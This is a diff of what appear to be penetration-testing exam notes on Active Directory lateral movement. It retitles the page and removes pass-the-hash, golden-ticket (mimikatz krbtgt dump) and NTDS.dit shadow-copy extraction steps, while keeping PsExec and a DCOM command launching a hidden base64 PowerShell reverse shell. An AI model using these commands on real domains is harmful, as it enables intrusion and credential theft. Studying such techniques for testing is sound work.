@@ -1,9 +1,9 @@
 ---
 layout: blank
-pagetitle: Active Directory Lateral Movement
+pagetitle: Pivoting via Active Directory
 ---
 
-Lateral movement doesn't have to be used for different subnets. If we have credentials but lack rdp, lateral movement as a domain user is our friend
+Useful when we can't install something like ligolo and pivot to compromise an internal machine
 
 ## WMI and WinRM
 
@@ -52,14 +52,6 @@ Enter-PSSession {PSSession_ID_returned}
 	- File and Printer sharing (on by default)
 - `./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd`
 
-## Pass the Hash (repeat from Module 16)
-- Only works for NTLM hashes (discussed in 16 - Password Attacks)
-- PsExec, Passing-the-hash toolkit, and Impacket can all pass hashes
-- SMB must be open
-- Impacket:
-	- `impacket-psexec -hashes :{hash} {DOMAIN}/{user}@{IP}` and
-	- `impacket-wmiexec -hashes :{hash} {DOMAIN}/{user}@{IP}`
-
 ## Overpass the Hash
 - Use an NTLM user hash to gain a full Kerberos TGT to get a TGS
 - Assumes we own a server that has a domain user's hash
@@ -93,32 +85,4 @@ Enter-PSSession {PSSession_ID_returned}
 	- `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{powershell -nop -w hidden -e {reverse_shell_powershell_base64}}","7")`
 
 ## SMB
-- `net view //{dnshostname or IP} /all`
-
-## Persistence
-- Not exactly tested by the exam, but shells can be flaky and these can help
-
-**Golden Ticket**
-- Trying to get the KDC's secret key to create self-made tickets for any service on the system
-- Requires full control over the DC or a being part of a Domain Admin group
-	- Or, requires krbtgt hash
-- Dump `krbtgt` NTLM hash with mimikatz
-	- `lsadump::lsa /patch`
-- After grabbing the hash, from any domain user:
-	- `kerberos::purge` to delete any existing tickets
-	- `kerberos::golden /user:{domain_user} /domain:{domain} /sid:{domain_SID} /krbtgt:{krbtgt_NTLM_hash} /ptt`
-		- The `domain_SID` can be gathered from whoami /user
-- This will essentially give the domain user Domain Admin privileges
-	- `PsExec.exe \\{domain_controller_dnshostname} powershell`
-		- Can't use the IP of the DC, as that will resort to NTLM
-		
-**Shadow Copies**
-- Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
-- As a domain admin, we can create a shadow copy and extract the NTDS.dit database file
-- Installed from [here](https://www.microsoft.com/en-us/download/details.aspx?id=23490)
-- Run `vshadow.exe -nw -p C:`
-- Then copy the Database from the shadow copy to the C: folder
-	- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
-- Then, save the SYSTEM hive with `reg.exe save hklm\system c:\system.bak`
-- We can now access all NTLM hashes and Kerberos keys using `impacket-secretsdump`
-	- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
+- `net view //{dnshostname_or_IP} /all`
